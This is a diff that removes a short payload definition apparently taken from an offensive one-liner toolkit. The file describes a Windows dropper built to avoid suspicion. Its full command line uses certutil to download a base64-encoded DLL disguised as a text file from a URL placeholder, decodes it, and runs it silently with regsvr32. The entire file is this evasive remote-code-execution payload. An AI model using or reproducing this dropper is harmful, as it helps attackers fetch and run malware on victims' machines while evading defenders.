@@ -1,7 +1,0 @@
-[Info]
-Author      = Karim shoair (D4Vinci)
-Description = Uses certutil to download your base64 encoded dll file like a txt file to avoid suspicion.
-
-[Payload]
-Type     = Dropper
-Payload  = certutil -urlcache -split -f {} google_https_cert.txt && certutil -decode google_https_cert.txt https_cert.dll && regsvr32 /s /u https_cert.dll
